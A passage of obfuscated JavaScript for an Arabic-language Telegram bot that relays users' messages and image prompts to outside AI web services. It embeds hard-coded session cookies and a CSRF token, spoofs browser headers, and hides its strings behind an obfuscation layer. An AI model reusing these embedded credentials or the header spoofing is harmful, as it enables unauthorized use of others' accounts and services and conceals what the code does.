            'JlBBz': _0x44c466(0xd5e) + 'م',
            'WHerL': _0x44c466(0x793) + '💬',
            'ZBpTc': _0x44c466(0x801)
        }, _0x46ce68 = _0x2cfd6e[_0x44c466(0x6a9)]['id'], _0xf23ee4 = _0x1cdf32[_0x44c466(0x70e)](_0x1cdf32[_0x44c466(0x70e)](_0x1cdf32[_0x44c466(0xdc8)](_0x1cdf32[_0x44c466(0x7a5)](_0x1cdf32[_0x44c466(0x589)](_0x1cdf32[_0x44c466(0x78f)](_0x44c466(0x5e1) + _0x44c466(0xe16), _0x44c466(0xc28) + _0x44c466(0xaaa) + _0x227517[_0x1cdf32[_0x44c466(0x7e7)]] + '`\x0a'), _0x44c466(0xd02) + '\x20' + _0x227517[_0x1cdf32[_0x44c466(0x964)]] + '\x20' + _0x227517[_0x1cdf32[_0x44c466(0xb91)]] + '\x0a'), _0x44c466(0xa2a) + _0x44c466(0x491) + _0x227517[_0x1cdf32[_0x44c466(0xc37)]] + '\x0a'), _0x44c466(0x6c3) + _0x44c466(0x3cd) + _0x227517[_0x1cdf32[_0x44c466(0xbeb)]] + '\x0a'), _0x44c466(0x46b) + _0x44c466(0xb9f) + _0x227517[_0x1cdf32[_0x44c466(0x873)]] + '\x0a'), _0x44c466(0x59e) + _0x44c466(0xb62) + _0x44c466(0xb30)), _0x3d8818 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x1cdf32[_0x44c466(0xce9)],
                            'callback_data': _0x1cdf32[_0x44c466(0xc42)]
                        }],
                    [{
                            'text': _0x1cdf32[_0x44c466(0xa0b)],
                            'callback_data': _0x44c466(0xae9) + _0x227517[_0x1cdf32[_0x44c466(0x7e7)]]
                        }]
                ]
            }
        };
    await bot[_0x44c466(0x708) + _0x44c466(0xdb0)](_0xf23ee4, {
        'chat_id': _0x46ce68,
        'message_id': _0x2cfd6e[_0x44c466(0x57f)],
        'parse_mode': _0x1cdf32[_0x44c466(0x482)],
        'reply_markup': _0x3d8818[_0x44c466(0x54f) + 'up']
    });
}
const الدردشاتالنشطة_2 = new Map();
function تنسيق_الرسائل(_0x107193) {
    const _0x5fd2a6 = _0x54266d;
    return _0x107193[_0x5fd2a6(0x79b)](([_0xea105e, _0x153f92]) => _0x5fd2a6(0x6d7) + _0xea105e + (_0x5fd2a6(0xc01) + '`') + _0x153f92 + '`')[_0x5fd2a6(0x75e)]('\x0a\x0a');
}
async function function2(_0x36f04a) {
    const _0x18361c = _0x54266d, _0x3bbe25 = {
            'YsfXD': _0x18361c(0x6d1) + _0x18361c(0x21d) + _0x18361c(0xd6b) + 'at',
            'ADXyR': _0x18361c(0xa76) + _0x18361c(0x196),
            'MxecB': _0x18361c(0xc2d),
            'HeQWz': _0x18361c(0x68f) + _0x18361c(0x922) + _0x18361c(0xa61) + _0x18361c(0xad9),
            'NilNT': _0x18361c(0x9d8) + _0x18361c(0x681),
            'jxAXe': _0x18361c(0x6d1) + _0x18361c(0x21d) + _0x18361c(0xdb6),
            'hwxKZ': _0x18361c(0x6d1) + _0x18361c(0x21d) + _0x18361c(0x3c9),
            'nCJFB': _0x18361c(0x700) + _0x18361c(0xd01) + _0x18361c(0x385) + _0x18361c(0x298),
            'UFpVe': _0x18361c(0xb6d),
            'cXmaC': _0x18361c(0xbc7) + _0x18361c(0x62f) + _0x18361c(0xc89) + _0x18361c(0x893) + _0x18361c(0x956) + _0x18361c(0x74f) + _0x18361c(0xa25) + _0x18361c(0xdb4) + _0x18361c(0xba1) + _0x18361c(0xa9a) + _0x18361c(0x3bb) + '6',
            'jEKjr': _0x18361c(0x4f2),
            'izTRV': _0x18361c(0xc71),
            'PUhGQ': _0x18361c(0xb72),
            'gPPXV': function (_0x13d331, _0x444715) {
                return _0x13d331 === _0x444715;
            }
        }, _0x13bec1 = _0x3bbe25[_0x18361c(0xc54)], _0x19d022 = {
            'authority': _0x3bbe25[_0x18361c(0x3ed)],
            'accept': _0x3bbe25[_0x18361c(0xcd7)],
            'accept-language': _0x3bbe25[_0x18361c(0x4f0)],
            'authorization': _0x18361c(0xde8) + tmo,
            'content-type': _0x3bbe25[_0x18361c(0xab1)],
            'origin': _0x3bbe25[_0x18361c(0x995)],
            'referer': _0x3bbe25[_0x18361c(0xaad)],
            'sec-ch-ua': _0x3bbe25[_0x18361c(0x2ed)],
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': _0x3bbe25[_0x18361c(0xb56)],
            'user-agent': _0x3bbe25[_0x18361c(0x53e)]
        }, _0x5ee50a = {
            'messages': [{
                    'role': _0x3bbe25[_0x18361c(0xc8c)],
                    'content': _0x36f04a
                }],
            'id': _0x3bbe25[_0x18361c(0x372)],
            'previewToken': null,
            'userId': null,
            'codeModelMode': !![],
            'agentMode': {},
            'trendingAgentMode': {},
            'isMicMode': ![],
            'userSystemPrompt': null,
            'maxTokens': 0x400,
            'playgroundTopP': 0.9,
            'playgroundTemperature': 0.5,
            'isChromeExt': ![],
            'githubToken': null,
            'clickedAnswer2': ![],
            'clickedAnswer3': ![],
            'clickedForceWebSearch': ![],
            'visitFromDelta': ![],
            'mobileClient': ![],
            'userSelectedModel': _0x3bbe25[_0x18361c(0xd71)]
        };
    try {
        const _0x40a159 = await axios[_0x18361c(0xa54)](_0x13bec1, _0x5ee50a, { 'headers': _0x19d022 });
        if (_0x3bbe25[_0x18361c(0xcae)](_0x40a159[_0x18361c(0x972)], 0x1ccd * 0x1 + -0x1ee5 + 0x2e0)) {
            const _0x3232ad = _0x40a159[_0x18361c(0x50f)];
            return _0x3232ad;
        } else
            return _0x18361c(0xaa7) + _0x40a159[_0x18361c(0x972)] + ',\x20' + _0x40a159[_0x18361c(0x246)];
    } catch (_0x49fe10) {
        return _0x18361c(0xaa7) + _0x49fe10[_0x18361c(0x842)];
    }
}
function انهاء_الدردشة(_0x7c8d54) {
    const _0x559361 = _0x54266d, _0x85fdf5 = { 'zEcXk': _0x559361(0xba8) + _0x559361(0xd73) };
    الدردشاتالنشطة_2[_0x559361(0x756)](_0x7c8d54) && (bot[_0x559361(0x741) + 'e'](_0x7c8d54, _0x85fdf5[_0x559361(0x2cf)]), الدردشاتالنشطة_2[_0x559361(0xbd4)](_0x7c8d54));
}
bot[_0x54266d(0xb39)](/\/ابدأㄹ허무/, _0x1fc7f8 => {
    const _0x684185 = _0x54266d, _0x526224 = {
            'OoWWW': _0x684185(0xb35) + _0x684185(0x891) + _0x684185(0x20b),
            'kZoJR': _0x684185(0x9cc),
            'eKuMu': _0x684185(0x1e6) + _0x684185(0xc2f),
            'kxgWG': _0x684185(0x76b) + 'ة',
            'mNzpA': _0x684185(0x538),
            'IEvgY': _0x684185(0x71f),
            'hFpWv': _0x684185(0x25f) + _0x684185(0x9db) + _0x684185(0xc4c) + 'ه.'
        }, _0x2a1e33 = _0x1fc7f8[_0x684185(0x6a9)]['id'], _0xe268cd = {
            'inline_keyboard': [
                [{
                        'text': _0x526224[_0x684185(0x6be)],
                        'callback_data': _0x526224[_0x684185(0x2e2)]
                    }],
                [{
                        'text': _0x526224[_0x684185(0xa22)],
                        'callback_data': _0x526224[_0x684185(0x6d5)]
                    }],
                [{
                        'text': _0x526224[_0x684185(0x30a)],
                        'callback_data': _0x526224[_0x684185(0x9b2)]
                    }]
            ]
        };
    bot[_0x684185(0x741) + 'e'](_0x2a1e33, _0x526224[_0x684185(0x442)], { 'reply_markup': _0xe268cd });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x15dd45 => {
    const _0x1b376b = _0x54266d, _0x292f2c = {
            'IoUSu': function (_0x6524dd, _0x37175) {
                return _0x6524dd === _0x37175;
            },
            'vbGGn': _0x1b376b(0x9cc),
            'AWYtf': _0x1b376b(0x857) + _0x1b376b(0x450) + _0x1b376b(0xb1a) + _0x1b376b(0x20f) + _0x1b376b(0x474) + _0x1b376b(0x636),
            'BtcNw': function (_0x41c3d1, _0x26fc2f, _0x9c1d9e) {
                return _0x41c3d1(_0x26fc2f, _0x9c1d9e);
            },
            'RLIfX': function (_0xab7d99, _0x7509f9) {
                return _0xab7d99 === _0x7509f9;
            },
            'vzIbv': _0x1b376b(0x76b) + 'ة',
            'hKiwr': _0x1b376b(0xa30) + _0x1b376b(0xa7d) + _0x1b376b(0x239) + _0x1b376b(0x20a) + _0x1b376b(0x5ea) + _0x1b376b(0xb47) + _0x1b376b(0xc74) + _0x1b376b(0xb96) + _0x1b376b(0x505) + _0x1b376b(0x332) + _0x1b376b(0x656) + _0x1b376b(0x24a) + _0x1b376b(0x9b5) + _0x1b376b(0x1ef) + 'ر.',
            'aHhIP': function (_0x451d56, _0x8f5512) {
                return _0x451d56(_0x8f5512);
            },
            'hrHnc': _0x1b376b(0x71f),
            'pdZJL': _0x1b376b(0x872) + _0x1b376b(0xbf3) + _0x1b376b(0xa8a) + _0x1b376b(0x24b) + _0x1b376b(0x2c6),
            'Iixmh': function (_0x10cb35, _0x3a369f) {
                return _0x10cb35(_0x3a369f);
            }
        }, _0x843c63 = _0x15dd45[_0x1b376b(0x842)][_0x1b376b(0x6a9)]['id'], _0x7d743b = _0x15dd45[_0x1b376b(0x50f)];
    if (_0x292f2c[_0x1b376b(0xda1)](_0x7d743b, _0x292f2c[_0x1b376b(0x4cc)]))
        bot[_0x1b376b(0x741) + 'e'](_0x843c63, _0x292f2c[_0x1b376b(0x616)]), الدردشاتالنشطة_2[_0x1b376b(0x928)](_0x843c63, !![]), _0x292f2c[_0x1b376b(0xab9)](setTimeout, () => انهاء_الدردشة(_0x843c63), 0x29403d + 0x2d05fe + 0x136d * -0x307);
    else {
        if (_0x292f2c[_0x1b376b(0xa5f)](_0x7d743b, _0x292f2c[_0x1b376b(0xb7f)])) {
            const _0xde1cfe = _0x292f2c[_0x1b376b(0x63a)], _0x507a2e = await _0x292f2c[_0x1b376b(0x1ec)](function2, _0xde1cfe);
            bot[_0x1b376b(0x741) + 'e'](_0x843c63, _0x507a2e);
        } else {
            if (_0x292f2c[_0x1b376b(0xa5f)](_0x7d743b, _0x292f2c[_0x1b376b(0xadb)])) {
                const _0x83d47c = _0x292f2c[_0x1b376b(0xa5e)], _0x21d565 = await _0x292f2c[_0x1b376b(0x46f)](function2, _0x83d47c);
                bot[_0x1b376b(0x741) + 'e'](_0x843c63, _0x21d565);
            }
        }
    }
}), bot['on'](_0x54266d(0x842), async _0x5a12b0 => {
    const _0x417f14 = _0x54266d, _0x8718e0 = {
            'GIZxb': function (_0x1a6779, _0x59b3e0) {
                return _0x1a6779(_0x59b3e0);
            }
        }, _0x3dc01e = _0x5a12b0[_0x417f14(0x6a9)]['id'];
    if (الدردشاتالنشطة_2[_0x417f14(0x756)](_0x3dc01e)) {
        const _0x259a17 = await _0x8718e0[_0x417f14(0x4f3)](function2, _0x5a12b0[_0x417f14(0x9ac)]);
        bot[_0x417f14(0x741) + 'e'](_0x3dc01e, _0x259a17);
    }
});
const cookies = _0x54266d(0x19b) + _0x54266d(0x2b0) + _0x54266d(0xd08) + _0x54266d(0xd04) + _0x54266d(0x2c3) + _0x54266d(0x9c8) + _0x54266d(0x9f5) + _0x54266d(0x5e6) + _0x54266d(0x6e8) + _0x54266d(0xb13) + _0x54266d(0xccc) + _0x54266d(0x73f) + _0x54266d(0xc33) + _0x54266d(0xd5c) + _0x54266d(0x5e0) + _0x54266d(0xac5) + _0x54266d(0x80a) + _0x54266d(0xa41) + _0x54266d(0xa26) + _0x54266d(0x711) + _0x54266d(0xdda) + _0x54266d(0x78c) + _0x54266d(0xd31) + _0x54266d(0x7a0) + _0x54266d(0x696) + _0x54266d(0x262) + _0x54266d(0x6c7), headers = {
        'Accept': _0x54266d(0xc2d),
        'Accept-Language': 'ar',
        'Connection': _0x54266d(0x226),
        'Content-Type': _0x54266d(0x9d8) + _0x54266d(0x681),
        'Cookie': cookies,
        'Origin': _0x54266d(0x6d1) + _0x54266d(0xa73) + 'om',
        'Referer': _0x54266d(0x6d1) + _0x54266d(0xa73) + _0x54266d(0x52a),
        'User-Agent': _0x54266d(0xbc7) + _0x54266d(0x62f) + _0x54266d(0xc89) + _0x54266d(0x893) + _0x54266d(0x956) + _0x54266d(0x74f) + _0x54266d(0xa25) + _0x54266d(0xdb4) + _0x54266d(0xba1) + _0x54266d(0xa9a) + _0x54266d(0x3bb) + '6'
    }, endSession = _0x537f4e => {
        const _0xeb49bd = _0x54266d, _0x4508cd = { 'LEUrA': _0xeb49bd(0x594) + _0xeb49bd(0xbf7) + _0xeb49bd(0x702) + _0xeb49bd(0xd78) + _0xeb49bd(0x5bc) };
        bot[_0xeb49bd(0x741) + 'e'](_0x537f4e, _0x4508cd[_0xeb49bd(0x701)]), delete userSessions[_0x537f4e];
    };
bot[_0x54266d(0xb39)](/\/sㅠtarㄹㅕㅎ/, _0x3ca26d => {
    const _0x42c55c = _0x54266d, _0x23188c = {
            'pzEWG': _0x42c55c(0x683),
            'jqiMZ': _0x42c55c(0x7ab),
            'nWeZb': _0x42c55c(0x3f5) + _0x42c55c(0x98d) + _0x42c55c(0x9f9) + _0x42c55c(0xc24)
        }, _0x47af27 = _0x3ca26d[_0x42c55c(0x6a9)]['id'], _0x407ca4 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x23188c[_0x42c55c(0x483)],
                            'callback_data': _0x23188c[_0x42c55c(0x6db)]
                        }]]
            }
        };
    bot[_0x42c55c(0x741) + 'e'](_0x47af27, _0x23188c[_0x42c55c(0xa27)], _0x407ca4);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x3fa63e => {
    const _0x393e70 = _0x54266d, _0x2d1525 = {
            'JmziV': function (_0x2b5da7, _0x28a4fb) {
                return _0x2b5da7 === _0x28a4fb;
            },
            'jgGOa': _0x393e70(0x7ab),
            'FmPSq': _0x393e70(0x91a) + _0x393e70(0xa66) + _0x393e70(0x9fc) + _0x393e70(0x254) + _0x393e70(0x728),
            'PcAXt': _0x393e70(0xb8f) + _0x393e70(0x728),
            'lljoO': function (_0x4977c5, _0x336e22, _0x5ede87) {
                return _0x4977c5(_0x336e22, _0x5ede87);
            }
        }, _0x365e34 = _0x3fa63e[_0x393e70(0x842)][_0x393e70(0x6a9)]['id'];
    _0x2d1525[_0x393e70(0xacd)](_0x3fa63e[_0x393e70(0x50f)], _0x2d1525[_0x393e70(0x569)]) && (userSessions[_0x365e34] ? bot[_0x393e70(0x741) + 'e'](_0x365e34, _0x2d1525[_0x393e70(0x999)]) : (bot[_0x393e70(0x741) + 'e'](_0x365e34, _0x2d1525[_0x393e70(0x4f9)]), userSessions[_0x365e34] = !![], _0x2d1525[_0x393e70(0x99c)](setTimeout, () => endSession(_0x365e34), -0xebaa2 + 0x2 * -0x6e74 + 0x18bf4a)));
}), bot['on'](_0x54266d(0x842), _0x27d390 => {
    const _0x4356ba = _0x54266d, _0x1264d0 = {
            'WfZqT': _0x4356ba(0xb53) + _0x4356ba(0x4cb) + _0x4356ba(0xc24),
            'mQHfe': _0x4356ba(0x6a4) + _0x4356ba(0x864) + _0x4356ba(0x888) + _0x4356ba(0x480) + _0x4356ba(0x7c1),
            'wQtPK': _0x4356ba(0x6d1) + _0x4356ba(0xa73) + _0x4356ba(0x437) + _0x4356ba(0x742)
        }, _0x2c5176 = _0x27d390[_0x4356ba(0x6a9)]['id'];
    if (userSessions[_0x2c5176]) {
        const _0x5e497e = { 'input': _0x27d390[_0x4356ba(0x9ac)] };
        axios[_0x4356ba(0xa54)](_0x1264d0[_0x4356ba(0x202)], _0x5e497e, { 'headers': headers })[_0x4356ba(0x992)](_0x4b5e57 => {
            const _0x4718b7 = _0x4356ba, _0x5a16f0 = _0x4b5e57[_0x4718b7(0x50f)][_0x4718b7(0x842)] || _0x1264d0[_0x4718b7(0x1fe)];
            bot[_0x4718b7(0x741) + 'e'](_0x2c5176, _0x4718b7(0x9aa) + _0x4718b7(0x7a7) + _0x4718b7(0x19d) + _0x5a16f0);
        })[_0x4356ba(0x2c4)](() => {
            const _0x11703d = _0x4356ba;
            bot[_0x11703d(0x741) + 'e'](_0x2c5176, _0x1264d0[_0x11703d(0xad5)]);
        });
    } else
        bot[_0x4356ba(0x741) + 'e'](_0x2c5176, '');
});
const COOKIE_DATA = {
        'sessionId': _0x54266d(0xc55) + _0x54266d(0x990) + _0x54266d(0x746) + _0x54266d(0x90b),
        'intercom-id-jlmqxicb': _0x54266d(0x3c7) + _0x54266d(0x613) + _0x54266d(0x916) + _0x54266d(0x578),
        'intercom-session-jlmqxicb': '',
        'intercom-device-id-jlmqxicb': _0x54266d(0xe1d) + _0x54266d(0x7d5) + _0x54266d(0x361) + _0x54266d(0x2ec),
        '__Host-authjs.csrf-token': _0x54266d(0x97c) + _0x54266d(0x63f) + _0x54266d(0x9c2) + _0x54266d(0xa52) + _0x54266d(0xc3e) + _0x54266d(0x789) + _0x54266d(0x9e9) + _0x54266d(0x980) + _0x54266d(0xc46) + _0x54266d(0x800) + _0x54266d(0xb0b) + _0x54266d(0xce2) + _0x54266d(0x572) + 'a',
        '__Secure-authjs.callback-url': _0x54266d(0x349) + _0x54266d(0x799) + _0x54266d(0xd47)
    }, REQUEST_HEADERS = {
        'authority': _0x54266d(0xa76) + _0x54266d(0x196),
        'accept': _0x54266d(0xc2d),
        'accept-language': _0x54266d(0x804) + _0x54266d(0x88f) + _0x54266d(0xd38),
        'content-type': _0x54266d(0x9d8) + _0x54266d(0x681),
        'origin': _0x54266d(0x6d1) + _0x54266d(0x21d) + _0x54266d(0xdb6),
        'referer': _0x54266d(0x6d1) + _0x54266d(0x21d) + _0x54266d(0xa88) + _0x54266d(0xda5) + _0x54266d(0x706) + 'Jp',
        'sec-ch-ua': _0x54266d(0x700) + _0x54266d(0xd01) + _0x54266d(0x385) + _0x54266d(0x298),
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': _0x54266d(0xb6d),
        'sec-fetch-dest': _0x54266d(0xa1d),
        'sec-fetch-mode': _0x54266d(0x304),
        'sec-fetch-site': _0x54266d(0x76f) + 'n',
        'user-agent': _0x54266d(0xbc7) + _0x54266d(0x62f) + _0x54266d(0xc89) + _0x54266d(0x893) + _0x54266d(0x956) + _0x54266d(0x74f) + _0x54266d(0xa25) + _0x54266d(0xdb4) + _0x54266d(0xba1) + _0x54266d(0xa9a) + _0x54266d(0x3bb) + '6'
    };
async function generateImageRequest(_0x522e64) {
    const _0x586ce3 = _0x54266d, _0x5c95d4 = {
            'sllDa': _0x586ce3(0xb09) + _0x586ce3(0xd09) + 'd',
            'yZXje': _0x586ce3(0x4f2),
            'qfVrb': _0x586ce3(0xda5) + _0x586ce3(0x706) + 'Jp',
            'gSQfp': _0x586ce3(0xd1e) + _0x586ce3(0x8fe),
            'oVtkR': _0x586ce3(0xbf6),
            'CDQiY': _0x586ce3(0x6d1) + _0x586ce3(0x21d) + _0x586ce3(0xd6b) + 'at',
            'dLSkR': _0x586ce3(0x9b3) + _0x586ce3(0x870) + _0x586ce3(0x67e)
        }, _0xbcdd21 = {
            'messages': [{
                    'id': _0x5c95d4[_0x586ce3(0x903)],
                    'content': _0x522e64,
                    'role': _0x5c95d4[_0x586ce3(0xc6e)]
                }],
            'id': _0x5c95d4[_0x586ce3(0x903)],
            'previewToken': null,
            'userId': null,
            'codeModelMode': !![],
            'agentMode': {
                'mode': !![],
                'id': _0x5c95d4[_0x586ce3(0x466)],
                'name': _0x5c95d4[_0x586ce3(0x405)]
            },
            'trendingAgentMode': {},
            'isMicMode': ![],
            'maxTokens': 0x400,
            'playgroundTopP': null,
            'playgroundTemperature': null,
            'isChromeExt': ![],
            'githubToken': null,
            'clickedAnswer2': ![],
            'clickedAnswer3': ![],
            'clickedForceWebSearch': ![],
            'visitFromDelta': ![],
            'mobileClient': ![],
            'userSelectedModel': _0x5c95d4[_0x586ce3(0x859)]
        };
    try {
        const _0x27fea3 = await axios[_0x586ce3(0xa54)](_0x5c95d4[_0x586ce3(0x2be)], _0xbcdd21, {
            'headers': REQUEST_HEADERS,
            'withCredentials': !![]
        });
        return _0x27fea3[_0x586ce3(0x50f)];
    } catch (_0x315b03) {
        return console[_0x586ce3(0x3a5)](_0x5c95d4[_0x586ce3(0x976)], _0x315b03), null;
    }
}
function extractImageUrl(_0x3943d7) {
    const _0x541971 = _0x54266d, _0x4a46f4 = {
            'iGTEN': _0x541971(0x6d2),
            'VXMJV': function (_0x11898f, _0x1c9a6f) {
                return _0x11898f !== _0x1c9a6f;
            },
            'BvMCJ': function (_0x1edc05, _0x2faf06) {
                return _0x1edc05 + _0x2faf06;
            },
            'RXulc': _0x541971(0x87f)
        }, _0x223b27 = _0x3943d7[_0x541971(0x670)](_0x4a46f4[_0x541971(0x7ac)]);
    if (_0x4a46f4[_0x541971(0x853)](_0x223b27, -(0x1de2 + 0x1 * -0x1eb9 + 0xd8))) {
        const _0x27dc5b = _0x4a46f4[_0x541971(0x24e)](_0x3943d7[_0x541971(0x670)](_0x4a46f4[_0x541971(0x381)], _0x223b27), -0xfe0 * 0x1 + 0x857 + 0x78d);
        return _0x3943d7[_0x541971(0x887)](_0x223b27, _0x27dc5b);
    }
    return null;
}
const userLastRequestTime = {}, userRequestFlag = {};
function getRemainingTime(_0x534470) {
    const _0x40b060 = _0x54266d, _0x319f62 = {
            'CQLzR': function (_0x4af73b, _0xf2f8e9) {
                return _0x4af73b in _0xf2f8e9;
            },
            'tsMFa': function (_0x5ba2c8, _0x4c4220) {
                return _0x5ba2c8 - _0x4c4220;
            },
            'pkxow': function (_0x3566f1, _0x57fc8e) {
                return _0x3566f1 - _0x57fc8e;
            },
            'HYLDQ': function (_0x495e91, _0x24e9ce) {
                return _0x495e91 / _0x24e9ce;
            },
            'AFzLL': function (_0x5132b2, _0x472f76) {
                return _0x5132b2 % _0x472f76;
            },
            'ysjYS': _0x40b060(0xdae) + _0x40b060(0xda4)
        };
    if (_0x319f62[_0x40b060(0x94a)](_0x534470, userLastRequestTime)) {
        const _0x2f98f7 = _0x319f62[_0x40b060(0x850)](Date[_0x40b060(0x45d)](), userLastRequestTime[_0x534470]), _0x2db9ed = Math[_0x40b060(0x1b0)](-0x70b * 0x2 + -0x6b6 + 0xb * 0x1e4, _0x319f62[_0x40b060(0x96c)](-0xfcd8d + -0x5e360 + -0x11d1 * -0x1fd, _0x2f98f7)), _0x2c19e5 = Math[_0x40b060(0xd54)](_0x319f62[_0x40b060(0x8e1)](_0x2db9ed, 0xb82d + 0x1 * 0x17412 + -0x25 * 0x8b3)), _0x574e00 = Math[_0x40b060(0xd54)](_0x319f62[_0x40b060(0x8e1)](_0x319f62[_0x40b060(0xa32)](_0x2db9ed, -0x7b32 * -0x2 + -0x6d37 * -0x1 + -0x793b), -0x9b9 + -0xde6 + 0x9 * 0x30f));
        return _0x2c19e5 + _0x40b060(0xc10) + _0x574e00 + _0x40b060(0xbbd);
    }
    return _0x319f62[_0x40b060(0x6f1)];
}
bot[_0x54266d(0xb39)](/\/stghiarㅗt/, _0x3a908c => {
    const _0x162f8a = _0x54266d, _0x313735 = {
            'oNoHT': _0x162f8a(0xacb) + _0x162f8a(0x60d),
            'yXUuy': _0x162f8a(0x23a) + _0x162f8a(0xad4) + _0x162f8a(0xca8) + 'ه:'
        }, _0x117e2e = _0x3a908c[_0x162f8a(0x6a9)]['id'], _0x5b39e3 = {
            'inline_keyboard': [[{
                        'text': _0x313735[_0x162f8a(0x6c1)],
                        'callback_data': 'ai'
                    }]]
        };
    bot[_0x162f8a(0x741) + 'e'](_0x117e2e, _0x313735[_0x162f8a(0x18e)], { 'reply_markup': _0x5b39e3 });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x59baa9 => {
    const _0x5c785e = _0x54266d, _0x16bcfa = {
            'yoJRL': function (_0x4352e7, _0x38efc0) {
                return _0x4352e7 === _0x38efc0;
            },
            'KfvcB': _0x5c785e(0x441),
            'cPNzL': _0x5c785e(0xa99) + _0x5c785e(0x7ee),
            'apTgL': _0x5c785e(0x720),
            'DCCFt': _0x5c785e(0xa99) + _0x5c785e(0x659),
            'KkTSP': _0x5c785e(0x23e) + _0x5c785e(0x265) + _0x5c785e(0xce0),
            'rQIEz': function (_0x527364, _0x4e8443) {
                return _0x527364 in _0x4e8443;
            },
            'HTduL': function (_0x5e7926, _0x1d8e15) {
                return _0x5e7926 < _0x1d8e15;
            },
            'RUxVj': function (_0x387320, _0x4357e3) {
                return _0x387320 - _0x4357e3;
            },
            'mSicZ': function (_0x171517, _0x289c9d) {
                return _0x171517(_0x289c9d);
            },
            'zawfg': _0x5c785e(0xa00) + _0x5c785e(0x6cc) + _0x5c785e(0xd41) + _0x5c785e(0xc4d) + 'ة.'
        }, _0x348e04 = _0x59baa9[_0x5c785e(0x842)][_0x5c785e(0x6a9)]['id'], _0x492c4e = _0x59baa9[_0x5c785e(0x50f)];
    if (_0x16bcfa[_0x5c785e(0xcd6)](_0x492c4e, 'ai')) {
        const _0x455f15 = {
            'inline_keyboard': [[
                    {
                        'text': _0x16bcfa[_0x5c785e(0x603)],
                        'callback_data': _0x16bcfa[_0x5c785e(0x295)]
                    },
                    {
                        'text': _0x16bcfa[_0x5c785e(0x9d1)],
                        'callback_data': _0x16bcfa[_0x5c785e(0x609)]
                    }
                ]]
        };
        await bot[_0x5c785e(0x708) + _0x5c785e(0xdb0)](_0x16bcfa[_0x5c785e(0x341)], {
            'chat_id': _0x348e04,
            'message_id': _0x59baa9[_0x5c785e(0x842)][_0x5c785e(0x57f)],
            'reply_markup': _0x455f15
        });
    } else {
        if (_0x16bcfa[_0x5c785e(0xcd6)](_0x492c4e, _0x16bcfa[_0x5c785e(0x295)])) {
            const _0x5c3a7a = Date[_0x5c785e(0x45d)]();
            if (_0x16bcfa[_0x5c785e(0x8e9)](_0x348e04, userLastRequestTime) && _0x16bcfa[_0x5c785e(0x2cc)](_0x16bcfa[_0x5c785e(0x8ee)](_0x5c3a7a, userLastRequestTime[_0x348e04]), -0x15627f + 0xbb80b + -0x1 * -0x176614)) {
                const _0x529cc5 = _0x16bcfa[_0x5c785e(0x449)](getRemainingTime, _0x348e04);
                await bot[_0x5c785e(0x741) + 'e'](_0x348e04, _0x5c785e(0x998) + _0x5c785e(0x34e) + _0x5c785e(0x68e) + _0x5c785e(0x5c0) + _0x5c785e(0x722) + _0x5c785e(0xe0f) + _0x529cc5 + '.');
            } else
                userLastRequestTime[_0x348e04] = _0x5c3a7a, userRequestFlag[_0x348e04] = !![], await bot[_0x5c785e(0x741) + 'e'](_0x348e04, _0x16bcfa[_0x5c785e(0x4fb)]);
        }
    }
}), bot['on'](_0x54266d(0x842), async _0x140c51 => {
    const _0x3f1105 = _0x54266d, _0x2f6768 = {
            'EEZyA': _0x3f1105(0x551) + _0x3f1105(0x940) + _0x3f1105(0x598) + _0x3f1105(0x392) + '.',
            'gcJPx': function (_0x2b6822, _0x490f54) {
                return _0x2b6822(_0x490f54);
            },
            'QupDi': _0x3f1105(0x2df) + 'r',
            'QkzjI': _0x3f1105(0x3b8),
            'SpZAF': _0x3f1105(0x5ff) + _0x3f1105(0xa65) + _0x3f1105(0x74e)
        }, _0x172b49 = _0x140c51[_0x3f1105(0x6a9)]['id'], _0x5980c2 = _0x140c51[_0x3f1105(0x9ac)];
    if (!userRequestFlag[_0x172b49]) {
        await bot[_0x3f1105(0x741) + 'e'](_0x172b49, '');
        return;
    }
    if (!/^[A-Za-z0-9\s.,!?-]+$/[_0x3f1105(0x78b)](_0x5980c2)) {
        await bot[_0x3f1105(0x741) + 'e'](_0x172b49, _0x2f6768[_0x3f1105(0x23b)]);
        return;
    }
    const _0x3d50f0 = await bot[_0x3f1105(0x741) + 'e'](_0x172b49, '✨'), _0x2703db = await _0x2f6768[_0x3f1105(0x4a4)](generateImageRequest, _0x5980c2), _0x4e9117 = _0x2f6768[_0x3f1105(0x4a4)](extractImageUrl, _0x2703db);
    if (_0x4e9117) {
        const _0xafbf6b = await axios[_0x3f1105(0x4bf)](_0x4e9117, { 'responseType': _0x2f6768[_0x3f1105(0x310)] }), _0x358df0 = Buffer[_0x3f1105(0x8e6)](_0xafbf6b[_0x3f1105(0x50f)], _0x2f6768[_0x3f1105(0x8e7)]);
        await bot[_0x3f1105(0x359)](_0x172b49, _0x358df0), await bot[_0x3f1105(0x802) + _0x3f1105(0x909)](_0x172b49, _0x3d50f0[_0x3f1105(0x57f)]), userRequestFlag[_0x172b49] = ![];
    } else
        await bot[_0x3f1105(0x741) + 'e'](_0x172b49, _0x2f6768[_0x3f1105(0xa4a)]), await bot[_0x3f1105(0x802) + _0x3f1105(0x909)](_0x172b49, _0x3d50f0[_0x3f1105(0x57f)]);
});
let user_last_req_HZ1 = {}, user_req_flag_xT9 = {};
async function img_gen_req_9uH(_0xca0363) {
    const _0x2cdd3d = _0x54266d, _0x593f21 = {
            'sXxWc': _0x2cdd3d(0x6d1) + _0x2cdd3d(0x6ea) + _0x2cdd3d(0x419) + _0x2cdd3d(0xd93) + _0x2cdd3d(0x4e9),
            'dtSYa': _0x2cdd3d(0xdce) + _0x2cdd3d(0x380),
            'NxEfB': _0x2cdd3d(0x9d8) + _0x2cdd3d(0x681),
            'GKmhi': _0x2cdd3d(0x68f) + _0x2cdd3d(0x922) + _0x2cdd3d(0xa61) + _0x2cdd3d(0xad9),
